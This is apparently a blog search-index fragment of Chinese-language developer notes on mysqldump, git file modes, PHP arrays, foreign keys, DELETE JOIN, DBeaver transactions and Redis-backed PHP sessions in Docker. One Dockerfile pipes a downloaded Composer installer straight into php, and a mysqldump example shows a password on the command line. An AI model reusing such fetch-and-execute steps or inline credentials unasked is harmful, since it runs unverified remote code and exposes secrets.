Mysqldump with Modern MySQL | Servers for Hackers ","date":"2019-04-25","objectID":"/blog/posts/mysqldump%E5%82%99%E4%BB%BDdatabase%E5%9B%BA%E5%AE%9A%E9%87%8F%E8%B3%87%E6%96%99/:1:0","tags":["mysqldump","mysql"],"title":"mysqldump備份database固定量資料","uri":"/blog/posts/mysqldump%E5%82%99%E4%BB%BDdatabase%E5%9B%BA%E5%AE%9A%E9%87%8F%E8%B3%87%E6%96%99/"},{"categories":["MySQL"],"content":"限制每個 table 數量 mysqldump -u [username] -p [dbname] {--opt} --where=\"true limit 100\" \u003e dump.sql mysql dump of talble limit 100 - Server Fault 如果運行 mysqldump 沒有–quick 或–opt 選項，mysqldump 在轉儲結果前將整個結果集裝入內存。如果轉儲大資料庫可能會出現問題。該選項預設啟用，但可以用–skip-opt 禁用。 Jax 的工作紀錄: (轉載)mysqldump 5.1 資料備份詳細指令 [MySQL] –opt 是 mysqldump 中的預設參數，參數功能相等於加入了 –add-drop-table –add-locks –create-options –disable-keys –extended-insert –-lock-tables –quick –set-charset 等參數 [MySQL]利用 mysqldump 備份 – FunMing 基地 FAQ 系列 | mysqldump 选项之 skip-opt-老叶茶馆-51CTO 博客 ","date":"2019-04-25","objectID":"/blog/posts/mysqldump%E5%82%99%E4%BB%BDdatabase%E5%9B%BA%E5%AE%9A%E9%87%8F%E8%B3%87%E6%96%99/:2:0","tags":["mysqldump","mysql"],"title":"mysqldump備份database固定量資料","uri":"/blog/posts/mysqldump%E5%82%99%E4%BB%BDdatabase%E5%9B%BA%E5%AE%9A%E9%87%8F%E8%B3%87%E6%96%99/"},{"categories":["MySQL"],"content":"鎖表解決方法 解決方法是用–skip-lock-tables 一、mysqldump 在備份數據庫時鎖表的問題 在使用’mysqldump’工具在備份庫表時，會對庫表進行鎖定，這會對業務的運行產生一定的影響；對於鎖表的過程及解決方法，作者也談談自己的認識。 緩解鎖定的方法： 1、Use –skip-lock-tables mysqldump option. Your tables won’t be locked, but your backup might be not consistent (depends on your schema: if your database transactions touch several tables at once, and one table is already backed up and other is not. For example: two tables: customers and orders. If customers is backed up first, and then new customer/order pair is inserted, you might end up with order without customer in your backup). This problem is primary reason why mysqldump locks all tables by default. If this issue does not apply to you, skipping the table locking in mysql is the most simple solution. 會影響數據的一致性(可能比丟數據還要遭糕)，故不推薦使用這個方法。 2、Use some other backup method. For example: Flush tables with read lock, create LVM snapshot, unlock tables, mount your LVM snapshot and back up your data. This gets quickly, much more complex than simple mysqldump. If your MySQL data is not on a LVM volume, you can create a slave MySQL server and back it up, without touching the master, so locking occurs on the slave and master is always free. 可以參考「lvm 備份 mysql 數據庫參考」，這篇文章。 mysqldump 在备份数据库的问题集-FreeOA ","date":"2019-04-25","objectID":"/blog/posts/mysqldump%E5%82%99%E4%BB%BDdatabase%E5%9B%BA%E5%AE%9A%E9%87%8F%E8%B3%87%E6%96%99/:3:0","tags":["mysqldump","mysql"],"title":"mysqldump備份database固定量資料","uri":"/blog/posts/mysqldump%E5%82%99%E4%BB%BDdatabase%E5%9B%BA%E5%AE%9A%E9%87%8F%E8%B3%87%E6%96%99/"},{"categories":["MySQL"],"content":"最後 SQL mysqldump -uroot -p123 test –skip-lock-tables \u003e c:\\test.sql 其他參考來源: mysqldump 与 innobackupex 备份过程你知多少 - xiaoboluo768 - 博客园 MySQL Database Export (100 Rows from each table in a database) - Stack Overflow \u003c—這個我沒有嘗試 使用 mysqldump 倒出 MySQL 所有資料庫(表) 固定筆數的資料 | Tsung’s Blog ","date":"2019-04-25","objectID":"/blog/posts/mysqldump%E5%82%99%E4%BB%BDdatabase%E5%9B%BA%E5%AE%9A%E9%87%8F%E8%B3%87%E6%96%99/:4:0","tags":["mysqldump","mysql"],"title":"mysqldump備份database固定量資料","uri":"/blog/posts/mysqldump%E5%82%99%E4%BB%BDdatabase%E5%9B%BA%E5%AE%9A%E9%87%8F%E8%B3%87%E6%96%99/"},{"categories":null,"content":"最近遇到 git 沒有變動的檔案 發現狀態跑出更動檔案 找了一下解決方法 $ git diff code.c old mode 100755 new mode 100644 這原因應該是 Linux、Window、Mac 之間檔案複製到不同台電腦做 git commit 可能會遇到的問題 git config core.filemode false 解決問題 在看情形是不是要全域做設定 參考來源: git tips: 设置 filemode，避免 NTFS 文件权限变更引起的修改 - 简书 git file mode change - 晓寒的个人空间 - OSCHINA git gui - How do I remove files saying “old mode 100755 new mode 100644” from unstaged changes in Git? - Stack Overflow git file mode change - 晓寒的个人空间 - OSCHINA 最近沒有時間整理這些資料 先預留 NOTE: (sharding DB 不太能做 join) 数据库 Sharding 的基本思想和切分策略 - Laurence 的技术博客 - CSDN 博客 MySQL Sharding 详解 - 简书 MySQL 分库分表，写得太好了！ - 51CTO.COM MySQL 上 sharding 的方案 | Gea-Suan Lin’s BLOG Docker 学习笔记_08 使用 Rancher pipeline 搭建基于容器的 CICD | 一个 DBA 的工作学习笔记 hexo 个人 next 主题博客接入谷歌广告 | Daryl’s Blog ","date":"2019-04-24","objectID":"/blog/posts/git-difff-%E5%87%BA%E7%8F%BEold-mode-100755-new-mode-100644/:0:0","tags":null,"title":"git difff 出現old mode 100755 new mode 100644","uri":"/blog/posts/git-difff-%E5%87%BA%E7%8F%BEold-mode-100755-new-mode-100644/"},{"categories":["PHP"],"content":"最近用 array_unique PHP: array_unique - Manual 他可以過濾重複的內容 但不小心用出一個 bug 例如有一個$array = [0,1,2,2,3,4]; 發現array_unique(array); var_dump 一看，key 發現有跳號 \u003c?php $array = [0,1,2,2,3,4]; var_dump($array); echo PHP_EOL; var_dump(array_unique($array)); array(6) { [0]=\u003e int(0) [1]=\u003e int(1) [2]=\u003e int(2) [3]=\u003e int(2) [4]=\u003e int(3) [5]=\u003e int(4) } array(5) { [0]=\u003e int(0) [1]=\u003e int(1) [2]=\u003e int(2) [4]=\u003e int(3) [5]=\u003e int(4) } 所以這時候做for($a = 0; $a \u003c count($a); $a++)會有問題 這邊有想到兩個做法 改 foreach array_values($array) 可以解決 ","date":"2019-04-21","objectID":"/blog/posts/PHP-%E9%99%A3%E5%88%97-array-unique-%E8%B8%A9%E9%9B%B7%E5%B0%8F%E8%A8%98/:0:0","tags":["php"],"title":"PHP 陣列 array_unique 踩雷小記","uri":"/blog/posts/PHP-%E9%99%A3%E5%88%97-array-unique-%E8%B8%A9%E9%9B%B7%E5%B0%8F%E8%A8%98/"},{"categories":["MySQL"],"content":"最近無聊想一些無聊的事情 最近做 db 主表刪除，在想一些關聯表是不是也要跟著刪除 雖然可以用INNER(or LEFT) JOIN容錯 但我還想知道一般正常開發者會不會做delete(我之前公司好像沒有這樣習慣) 不過，假如要刪除會選哪一種刪除方法 目前知道用 DB 設定 table 結構刪除 DB 設定 trigger 程式手動設定刪除 不知這幾種會用哪一種，所以網路上找到一些答案整理 ","date":"2019-04-21","objectID":"/blog/posts/%E4%B8%BB%E8%A1%A8%E5%92%8C%E9%97%9C%E8%81%AF%E8%A1%A8%E8%A6%81%E4%B8%8D%E8%A6%81%E5%85%A8%E5%88%AA-%E5%92%8C-%E5%A4%96%E4%BE%86%E9%8D%B5%E4%B8%80%E4%BA%9B%E6%95%B4%E7%90%86/:0:0","tags":["mysql"],"title":"主表和關聯表要不要全刪 和 外來鍵一些整理","uri":"/blog/posts/%E4%B8%BB%E8%A1%A8%E5%92%8C%E9%97%9C%E8%81%AF%E8%A1%A8%E8%A6%81%E4%B8%8D%E8%A6%81%E5%85%A8%E5%88%AA-%E5%92%8C-%E5%A4%96%E4%BE%86%E9%8D%B5%E4%B8%80%E4%BA%9B%E6%95%B4%E7%90%86/"},{"categories":["MySQL"],"content":"外來鍵 数据库该不该使用外键 - 王者之峰 - CSDN 博客 6.html) 大家设计数据库时使用外键吗？ - 知乎 数据库设计要不要外键？-CSDN 论坛 有看到幾篇，說外來鍵很吃 DB 效能 正常可以用程式邏輯去解決掉 不過當然設定外來鍵可以減少資料不正確問題 目前看到有報表程式會用到外來鍵 問題引入 以前的意識裡都是需要建立外鍵，外鍵能起到約束作用，能保證數據的完整性和一直性，比如如果沒有外鍵約束，你自己程序控制又不到位把基本信息都刪除了，詳情卻存在，人的基本信息不存在了，工資信息裡卻存在這個人，想要找這個人究竟是誰都找不到。 今天看到原來的外鍵都被去掉了，問了下組長，結果回答就兩個字「效率」，雖然感覺很詫異，但是畢竟人家比我有經驗並沒有去爭論，下面將站在兩個對立面去贊成和反對建立外鍵。 作者：qq_23473123 来源：CSDN 原文：https://blog.csdn.net/qq_23473123/article/details/79273066 版权声明：本文为博主原创文章，转载请附上博文链接！ 今天看到這篇，果然過來人經驗還是要聽的 之前我前公司我在開發 table 設定多個主鍵我是依照需求開的(我前公司沒有用 id 當主鍵) 我有一個前輩跟我講這樣設計不會很好 程式會缺乏彈性，以後需求變動不是很好改 通常可以用程式邏輯去做判斷 相關外來鍵設定 [ON DELETE {CASCADE | SET NULL | NO ACTION | RESTRICT}] [ON UPDATE {CASCADE | SET NULL | NO ACTION | RESTRICT}] 參數解釋： CASCADE - 會將有所關聯的紀錄行也會進行刪除或修改。 SET NULL - 會將有所關聯的紀錄行設定成 NULL。 NO ACTION - 有存在的關聯紀錄行時，會禁止父資料表的刪除或修改動作。 RESTRICT - 與 NO ACTION 相同。 MySQL 建立 Foreign Key ( InnoDB ) 時要注意的一件事 @ Amin’s Note :: 痞客邦 :: [第二十四個夏天後: [MySQL] 使用 FOREIGN KEY 筆記 @ MySQL 5.6](http://blog.changyy.org/2015/01/mysql-foreign-key-mysql-5 簡單小記，使用外來鍵 主表和關聯表，從關聯表設定外來鍵，這樣主表要先建立對應 id 關聯表才能新增資料 反之 主表要先刪除關聯表資料，主表才能做刪除動作(PS: 這些動作都是看你設定什麼) 不過，我覺得還是要看情況，以許是很死的東西(ex:報表、會計) 可以用 table，這樣能更確定資料的安全 但大部分系統可能不用加入外來鍵 ","date":"2019-04-21","objectID":"/blog/posts/%E4%B8%BB%E8%A1%A8%E5%92%8C%E9%97%9C%E8%81%AF%E8%A1%A8%E8%A6%81%E4%B8%8D%E8%A6%81%E5%85%A8%E5%88%AA-%E5%92%8C-%E5%A4%96%E4%BE%86%E9%8D%B5%E4%B8%80%E4%BA%9B%E6%95%B4%E7%90%86/:1:0","tags":["mysql"],"title":"主表和關聯表要不要全刪 和 外來鍵一些整理","uri":"/blog/posts/%E4%B8%BB%E8%A1%A8%E5%92%8C%E9%97%9C%E8%81%AF%E8%A1%A8%E8%A6%81%E4%B8%8D%E8%A6%81%E5%85%A8%E5%88%AA-%E5%92%8C-%E5%A4%96%E4%BE%86%E9%8D%B5%E4%B8%80%E4%BA%9B%E6%95%B4%E7%90%86/"},{"categories":["MySQL"],"content":"主表刪除，關聯表是否會刪除 這個問題網路上找不到人討論這個問題 我之前是沒有刪除，但最近想到這個問題 仔細想想舊資料殘留在上面好像浪費空間 又沒有意義，假如沒有特需用途還是手動刪除吧 結論還是無聊想一些無聊的事情手動刪除吧!! ","date":"2019-04-21","objectID":"/blog/posts/%E4%B8%BB%E8%A1%A8%E5%92%8C%E9%97%9C%E8%81%AF%E8%A1%A8%E8%A6%81%E4%B8%8D%E8%A6%81%E5%85%A8%E5%88%AA-%E5%92%8C-%E5%A4%96%E4%BE%86%E9%8D%B5%E4%B8%80%E4%BA%9B%E6%95%B4%E7%90%86/:2:0","tags":["mysql"],"title":"主表和關聯表要不要全刪 和 外來鍵一些整理","uri":"/blog/posts/%E4%B8%BB%E8%A1%A8%E5%92%8C%E9%97%9C%E8%81%AF%E8%A1%A8%E8%A6%81%E4%B8%8D%E8%A6%81%E5%85%A8%E5%88%AA-%E5%92%8C-%E5%A4%96%E4%BE%86%E9%8D%B5%E4%B8%80%E4%BA%9B%E6%95%B4%E7%90%86/"},{"categories":["MySQL"],"content":"上一篇，要嘗試刪除語句 在想刪除主表後，其餘關聯表示不是需要手動刪除?? 但這篇先不談這個 最近看到兩篇發現 sql delete 可以做 join 動作刪除!!! 先來筆記吧!! SQL：如何实现带有内连接的 DELETE？ - 问答 - 云+社区 - 腾讯云 SQL 中使用 update inner join 和 delete inner join - linFen - 博客园 發現可能不是每個 DB 都可以這樣做 db2 可能沒有!! IBM DELETE 介紹頁面 但為什麼我想一次做完呢? 因為現在 DB 我們公司做 auto commit 所以我想一次解決 XDD 指細看也沒有人說不要用 -- DELETE 刪除大法 delete a1, a2 FROM `db`.`a1_table` a1 JOIN `db`.`a2_table` a2 ON a1.id = a2.a1_id WHERE a1.id = 1; -- 另類刪除方法 delete a1, a2 FROM `db`.`a1_table` a1, `db`.`a2_table` a2 WHERE a1.id = a2.a1_id and a1.id =1; 這邊有小提示 delete ... from 中間是指要刪除的表格(可以使用自訂的 table) 這邊上面用 inner join 會遇到有一個問題 所以當關聯表沒資料，就不會刪掉 所以改成 left join 會比較好 強者我同事之前提過 letcode 有人這樣解題 leetcode/database/DeleteDuplicateEmails at master · int32bit/leetcode DELETE p1 FROM Person p1, Person p2 WHERE p1.Email = p2.Email AND p1.Id \u003e p2.Id MySQL DELETE JOIN: Deleting Data from Multiple Tables 先記到這樣!!! ","date":"2019-04-20","objectID":"/blog/posts/MySQL-delete-%E4%B8%80%E6%AC%A1%E5%88%AA%E9%99%A4%E6%8C%87%E5%AE%9A%E5%A4%9A%E5%80%8B%E8%B3%87%E6%96%99%E8%A1%A8%E6%AC%84%E4%BD%8D%E6%96%B9%E6%B3%95/:0:0","tags":["mysql","delete"],"title":"MySQL delete 一次刪除指定多個資料表欄位方法","uri":"/blog/posts/MySQL-delete-%E4%B8%80%E6%AC%A1%E5%88%AA%E9%99%A4%E6%8C%87%E5%AE%9A%E5%A4%9A%E5%80%8B%E8%B3%87%E6%96%99%E8%A1%A8%E6%AC%84%E4%BD%8D%E6%96%B9%E6%B3%95/"},{"categories":["MySQL"],"content":"因為最近公司要測試刪除功能 但是很怕誤刪自己 localhost 資料 在想有什麼方法可以簡單測試 後來想到交易功能 XYZ 的筆記本: MySQL 交易功能 Transaction 整理 在這篇能簡單看到用法 不過，我最近工作環境只裝 DBeaver 所以在想有什麼方案 最後有想到用交易功能 其實很簡單，只要連線 DB，F3開啟 new Script 確定上面是否連線指定DB 提交/取消指令 commit/手動交易 切換auto 下面還有一些設定 聽說是跟 Isolation 有關係 這個我就不清楚了 有時間在了解一下，我映像中好像有些設定 db 查詢時候 db 會 lock，聽說跟這個有關係 資料庫交易的 Isolation – getamis – Medium 參考來源: Auto and Manual Commit Modes · dbeaver/dbeaver Wiki Pending Transactions · dbeaver/dbeaver Wiki ","date":"2019-04-20","objectID":"/blog/posts/DBeaver%E4%BA%A4%E6%98%93%E5%8A%9F%E8%83%BD%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95-Transaction/:0:0","tags":["dbeaver","transaction","mysql"],"title":"DBeaver交易功能使用方法(Transaction)","uri":"/blog/posts/DBeaver%E4%BA%A4%E6%98%93%E5%8A%9F%E8%83%BD%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95-Transaction/"},{"categories":["PHP"],"content":"最近 PHP 要設定 redis 不過這一快真的不是很熟 所以 GOOGLE 有找一下設定方法 這邊整理 ","date":"2019-04-13","objectID":"/blog/posts/PHP%E8%A8%AD%E5%AE%9Asession%E7%82%BAredis%E6%96%B9%E6%B3%95-Dockerfile/:0:0","tags":["php","redis","session"],"title":"PHP設定session為redis方法(Dockerfile)","uri":"/blog/posts/PHP%E8%A8%AD%E5%AE%9Asession%E7%82%BAredis%E6%96%B9%E6%B3%95-Dockerfile/"},{"categories":["PHP"],"content":"PHP session 吃 redis (Dockerfile) FROM php:7.1-fpm RUN apt-get update \u0026\u0026 \\ apt-get install unzip wget -y \u0026\u0026 \\ cd /tmp \u0026\u0026 \\ wget https://github.com/phpredis/phpredis/archive/master.zip -O phpredis.zip \u0026\u0026 \\ unzip -o /tmp/phpredis.zip \u0026\u0026 \\ mv /tmp/phpredis-* /tmp/phpredis \u0026\u0026 \\ cd /tmp/phpredis \u0026\u0026 \\ phpize \u0026\u0026 \\ ./configure \u0026\u0026 \\ make \u0026\u0026 \\ make install \u0026\u0026 \\ mkdir -p /etc/php5/mods-available/ \u0026\u0026 \\ touch /etc/php5/mods-available/redis.ini \u0026\u0026 \\ echo extension=redis.so \u003e /etc/php5/mods-available/redis.ini \u0026\u0026 \\ ln -s /etc/php5/mods-available/redis.ini /usr/local/etc/php/conf.d \u0026\u0026 \\ echo \"session.save_handler = redis\\nsession.save_path = tcp://redis/6379\" \u003e\u003e /usr/local/etc/php/conf.d/docker-php-ext-redis.ini \u0026\u0026 \\ apt-get remove unzip wget -y \u0026\u0026 \\ apt-get clean \u0026\u0026 \\ rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/ RUN usermod -u 1000 www-data \u0026\u0026 \\ chown -R www-data:www-data /var/www/html/ WORKDIR /var/www/html VOLUME /var/www/html EXPOSE 9000 php-redis-session/Dockerfile at master · DawTaylor/php-redis-session 這邊可能要注意 這個範例只有包 php-fpm(沒有 redis) tcp://redis/6379這一段 redis 需要照你的環境設定調整 ## redis 架設 docker run --name redis -d redis ## php-redis docker run -d -p 80:80 --rm --name my-app -v `pwd`:/var/www/html --link redis dawtaylor/php-redis-session:5.6-apache DawTaylor/php-redis-session 文件有簡單說明，但沒有作 link 測試使用方法可以寫一個 phpinfo 去看設定 或者寫一個測試 php session \u003c?php session_start(); $_SESSION['test'] = 2; var_dump($_SESSION); ## redis cli 指令，可以進去container打redis-cli進入 keys * ## 查看某一個redis資料 get PHPREDIS_SESSION:b234200eb3afc2803630be437b177bd0 KEYS – Redis ","date":"2019-04-13","objectID":"/blog/posts/PHP%E8%A8%AD%E5%AE%9Asession%E7%82%BAredis%E6%96%B9%E6%B3%95-Dockerfile/:1:0","tags":["php","redis","session"],"title":"PHP設定session為redis方法(Dockerfile)","uri":"/blog/posts/PHP%E8%A8%AD%E5%AE%9Asession%E7%82%BAredis%E6%96%B9%E6%B3%95-Dockerfile/"},{"categories":["PHP"],"content":"php.ini 設定 安裝 php-pecl-redis： yum install php-pecl-redis 修改 PHP 設定檔： session.save_handler = redis session.save_path = \"tcp://127.0.0.1:6379?auth=密碼\" 其中 session.save_path 的格式為 session.save_path = “tcp://host1:6379?weight=1, tcp://host2:6379?weight=2\u0026timeout=2.5, tcp://host3:6379?weight=2\u0026read_timeout=2.5” 可設定的參數有：weight、timeout、persistent、prefix(預設\"PHPREDIS_SESSION:\")、auth、database… XYZ 的筆記本: PHP 使用 Redis 儲存 Session ","date":"2019-04-13","objectID":"/blog/posts/PHP%E8%A8%AD%E5%AE%9Asession%E7%82%BAredis%E6%96%B9%E6%B3%95-Dockerfile/:1:1","tags":["php","redis","session"],"title":"PHP設定session為redis方法(Dockerfile)","uri":"/blog/posts/PHP%E8%A8%AD%E5%AE%9Asession%E7%82%BAredis%E6%96%B9%E6%B3%95-Dockerfile/"},{"categories":["PHP"],"content":"redis cluster 為什麼設定 redis cluster 要設定多個 IP? 這原本是我第一個疑問，但是網路上都沒有看到有人講這個 最後猜測是其實連其中一台，就可以做了 但是設定那台掛掉就連到 redis 不過我很好奇，怎麼不會用 haproxy 或 dns 去做設定?? ","date":"2019-04-13","objectID":"/blog/posts/PHP%E8%A8%AD%E5%AE%9Asession%E7%82%BAredis%E6%96%B9%E6%B3%95-Dockerfile/:2:0","tags":["php","redis","session"],"title":"PHP設定session為redis方法(Dockerfile)","uri":"/blog/posts/PHP%E8%A8%AD%E5%AE%9Asession%E7%82%BAredis%E6%96%B9%E6%B3%95-Dockerfile/"},{"categories":["PHP"],"content":"redis cluster 簡單介紹 (PS:這邊有參雜我自己的想法) 因為目前沒有自己架設 redis cluster，所以我就不先研究那一快 畢竟我連 redis 架設可能不是很熟 但我覺得還是要了解他怎麼運作 一直設定 redis 連線設定，但我覺得還是要了解一下 簡單我目前看到的認知 redis 有 master→slave (slave→slave) 這跟 mysql 一樣，有做備份的解決方案 在 redis 3.0 之前沒有 cluster 功能 所以會看到 sentinel 這個東西(目前我網路上看到的了解) 這個有點像是會監測 master 有沒有掛掉 假如掛掉的話，他會把 slave 調成 master 這樣你程式掛掉還是可以使用 cluster 也是有做這個事情 網路有看到 sentinel 沒辦法馬上做到 redis 掛掉那瞬間第一毫秒 所以有大量資料近來，有風險程式會沒接收到 假如沒寫好 try…catch 就會遺失資料 簡單來說，redis cluster 正常來說會有六台 3 台 master3 台 slave，1 台 master 對應各 1 個 slave 3 個 master 做 cluster，當有一台 master 掛掉 slave 會變成 master 維持線上服務 為什麼設定 redis cluster 要設定多個 IP? 這原本是我第一個疑問，但是網路上都沒有看到有人講這個 最後猜測是其實連其中一台，就可以做了 但是設定那台掛掉就連到 redis 不過我很好奇，怎麼不會用 haproxy 或 dns 去做設定?? 這邊我做一個假說，redis cluster 程式做多組 IP 是為了當第一台掛掉 可能連第二台 IP，所以這邊會放多組原因，就算連到的話。redis cluster 也會分配其中一台 那為什麼不做 haproxy，設定就不會那麼麻煩 基于代理的分片 … 代理层多了一次转发，性能有所损耗。 Redis Cluster 深入与实践（续） - 掘金 備份圖 看來設定多組有這個原因，所以才不用 haproxy，但不知道為什麼沒設定 DNS 呢? DNS 導向也會影響? 這個問題我還沒想到 ","date":"2019-04-13","objectID":"/blog/posts/PHP%E8%A8%AD%E5%AE%9Asession%E7%82%BAredis%E6%96%B9%E6%B3%95-Dockerfile/:2:1","tags":["php","redis","session"],"title":"PHP設定session為redis方法(Dockerfile)","uri":"/blog/posts/PHP%E8%A8%AD%E5%AE%9Asession%E7%82%BAredis%E6%96%B9%E6%B3%95-Dockerfile/"},{"categories":["PHP"],"content":"phpredis,predis 網路上有看到這兩個工具 簡來來說 phpredis 是透過 C 源生連線 predis 是透過 socket 去做連線 可能上方效能會比較好 predis 不需要安裝 redis 連線工具 在 php 中使用 redis cluster 集群 - 作业部落 Cmd Markdown 编辑阅读器 predis，是 PHP 版本寫的 redis client，採用 socket 連接 php extension redis 是 PHP 原生擴展，C 寫的 由於沒有進行過大數據壓測，不能準確告訴你性能差異。但基本上擴展 redis 肯定比 predis 更好。 Laravel 推薦用 predis，主要是當心一些主機沒有支持 redis 吧。儘量少依賴 C 擴展，這樣才能發揮 PHP 普及眾生的思想。 predis 包和 phpredis 扩展的区别是什么 - SegmentFault 思否 ","date":"2019-04-13","objectID":"/blog/posts/PHP%E8%A8%AD%E5%AE%9Asession%E7%82%BAredis%E6%96%B9%E6%B3%95-Dockerfile/:2:2","tags":["php","redis","session"],"title":"PHP設定session為redis方法(Dockerfile)","uri":"/blog/posts/PHP%E8%A8%AD%E5%AE%9Asession%E7%82%BAredis%E6%96%B9%E6%B3%95-Dockerfile/"},{"categories":["PHP"],"content":"有關 docker 架設資源 Grokzen/docker-redis-cluster: Dockerfile for Redis Cluster (redis 3.0+) 使用 docker 建立 Redis Cluster - 更新版 - Yowko’s Notes 基於設定我就不多研究了 我看不懂裡面設定 先暫時留在這邊 相關來源: 在 php 中使用 redis cluster 集群 - 作业部落 Cmd Markdown 编辑阅读器 predis 包和 phpredis 擴展的區別是什麼 - SegmentFault 思否 phpredis Redis 集群 Redis Cluster - zh7314 - 博客园 面试中关于 Redis 的问题看这篇就够了 - 掘金 一文輕鬆搞懂 redis 集群原理及搭建與使用 - 掘金 php-redis-session/php-7.1 at master · DawTaylor/php-redis-session php 如何通过 pecl 安装 redis 扩展 深入浅出 Docker 技术- Redis sentinel 集群的搭建 – VieMall Redis Cluster 深入与实践 | Aoho’s Blog Redis Cluster 深入与实践（续） - 掘金 使用 docker 建立 Redis Cluster - 更新版 - Yowko’s Notes XYZ 的筆記本: PHP 使用 Redis 儲存 Session 2019-07-10 最近公司要用 redis cluster 所以 Google 一下設定 phpredis/cluster.markdown at develop · phpredis/phpredis XYZ 的筆記本: PHP 使用 Redis 儲存 Session 這個設定要安裝 pecl-php-redis session.save_handler = rediscluster session.save_path = \"seed[]=host1:port1\u0026seed[]=host2:port2\u0026seed[]=hostN:portN\u0026timeout=2\u0026read_timeout=2\u0026failover=error\u0026persistent=1\u0026auth=password\" 設定沒有想像中麻煩 save_path 可用 array_map 和 join 去組出字串 ","date":"2019-04-13","objectID":"/blog/posts/PHP%E8%A8%AD%E5%AE%9Asession%E7%82%BAredis%E6%96%B9%E6%B3%95-Dockerfile/:2:3","tags":["php","redis","session"],"title":"PHP設定session為redis方法(Dockerfile)","uri":"/blog/posts/PHP%E8%A8%AD%E5%AE%9Asession%E7%82%BAredis%E6%96%B9%E6%B3%95-Dockerfile/"},{"categories":["PHP"],"content":"最近有專案需要用到 phpredis,mcrypt 所以 php-fpm 需要安裝套件 有 google 找到方法 這邊簡單筆記 ","date":"2019-04-10","objectID":"/blog/posts/php7%E5%AE%89%E8%A3%9Dphpredis%E5%92%8Cmcrypt%E5%9C%A8docker%E6%96%B9%E6%B3%95/:0:0","tags":["php","phpredis","mcrypt"],"title":"php7安裝phpredis和mcrypt在docker方法","uri":"/blog/posts/php7%E5%AE%89%E8%A3%9Dphpredis%E5%92%8Cmcrypt%E5%9C%A8docker%E6%96%B9%E6%B3%95/"},{"categories":["PHP"],"content":"phpredis phpredis 安裝很順利 RUN pecl install redis \u0026\u0026 docker-php-ext-enable redis ","date":"2019-04-10","objectID":"/blog/posts/php7%E5%AE%89%E8%A3%9Dphpredis%E5%92%8Cmcrypt%E5%9C%A8docker%E6%96%B9%E6%B3%95/:1:0","tags":["php","phpredis","mcrypt"],"title":"php7安裝phpredis和mcrypt在docker方法","uri":"/blog/posts/php7%E5%AE%89%E8%A3%9Dphpredis%E5%92%8Cmcrypt%E5%9C%A8docker%E6%96%B9%E6%B3%95/"},{"categories":["PHP"],"content":"mcrypt 在 PHP7.0 好像就不能使用，所以需要手動安裝 網路上看到 PHP mcrypt extension 的安裝步驟 sudo apt install re2c php7.2-dev libmcrypt-dev # php7.2-dev for phpize sudo pecl install mcrypt-1.0.1 # 產生在 /usr/lib/php/20170718/mcrypt.so PHP mcrypt 的設定步驟 sudo vim /etc/php/7.2/mods-available/mcrypt.ini extension=mcrypt.so sudo phpenmod mcrypt 重新啟動 php / cgi / web 即可 這邊這一行pecl install mcrypt-1.0.1我在 php7.3 安裝不行 PECL :: Package :: mcrypt 不過看到 mcrypt 也有持續在更新，所以只要抓最新版 1.0.2 就可以安裝 這時候可以在 phpinfo 裡面看有沒有正常安裝 分享 Dockerfile FROM php:7.3-fpm RUN apt-get update -y \u0026\u0026 apt-get install -y openssl zip unzip git libmcrypt-dev RUN curl -sS https://getcomposer.org/installer | php -- --install-dir=/usr/local/bin --filename=composer RUN docker-php-ext-install opcache bcmath pdo_mysql mysqli RUN pecl install redis \u0026\u0026 docker-php-ext-enable redis RUN pecl install mcrypt-1.0.2 \u0026\u0026 docker-php-ext-enable mcrypt ARG DIR WORKDIR $DIR RUN composer install 好奇 docker-php-ext-enable 有做什麼，所以有查了一下 ","date":"2019-04-10","objectID":"/blog/posts/php7%E5%AE%89%E8%A3%9Dphpredis%E5%92%8Cmcrypt%E5%9C%A8docker%E6%96%B9%E6%B3%95/:2:0","tags":["php","phpredis","mcrypt"],"title":"php7安裝phpredis和mcrypt在docker方法","uri":"/blog/posts/php7%E5%AE%89%E8%A3%9Dphpredis%E5%92%8Cmcrypt%E5%9C%A8docker%E6%96%B9%E6%B3%95/"},{"categories":["PHP"],"content":"docker-php-ext-install 簡單來講就是安裝 PHP 內建現有套件 php 目录下还准备好了 php 配置文件 php.ini 以及 php-fpm.conf，基础镜像我们选择的是 PHP 5.6-FPM，这同样是一个 Debian Jessie 镜像。官方比较亲切的在镜像内部准备了一个 docker-php-ext-install 指令，可以快速安装如 GD、PDO 等常用扩展。所有支持的扩展名称可以通过在容器内运行 docker-php-ext-install 获得。 Docker 在 PHP 项目开发环境中的应用 - DockOne.io docker-php-ext-install Reference ","date":"2019-04-10","objectID":"/blog/posts/php7%E5%AE%89%E8%A3%9Dphpredis%E5%92%8Cmcrypt%E5%9C%A8docker%E6%96%B9%E6%B3%95/:3:0","tags":["php","phpredis","mcrypt"],"title":"php7安裝phpredis和mcrypt在docker方法","uri":"/blog/posts/php7%E5%AE%89%E8%A3%9Dphpredis%E5%92%8Cmcrypt%E5%9C%A8docker%E6%96%B9%E6%B3%95/"},{"categories":["PHP"],"content":"docker-php-ext-enable 原本我在php7 - docker-php-ext-enable 的原理？ - SegmentFault 思否看不是很懂 後來docker-php-ext-enable 可以開啟擴展的原理 | 一顆西瓜籽這篇看懂 開啟擴展的那一行是寫在文件/usr/local/etc/php/conf.d/docker-php-ext-擴展名.ini 這個配置文件裡面的。查看命令 php -i 的輸出 … 煥然大悟。 看著這篇「恍然大悟」，我也跟者恍然大悟 XD docker-php-ext-enable 可以开启扩展的原理 | 一颗西瓜籽 最後windows 下 php 无法使用 mcrypt 的解决 - xieye - ITeye 博客，因為不知道 window 要怎麼安裝 mcrypt 剛好有翻到這篇，不過我沒有嘗試。 參考來源: How to install php-redis extension using the official PHP Docker image approach? - Stack Overflow How to install mcrypt in php7.2 / php7.3 | Lukáš Mešťan docker php7.2 not installing mcrypt · Issue #541 · docker-library/php windows 下 php 无法使用 mcrypt 的解决 - xieye - ITeye 博客 php7.1 加密解密 openssl_encrypt 替代 mcrypt - 简书 最近看到有人分享 phpenv.cn 發現裡面有整合 nginx 和 redis 為什麼會寫在這邊呢 怕忘記寫… 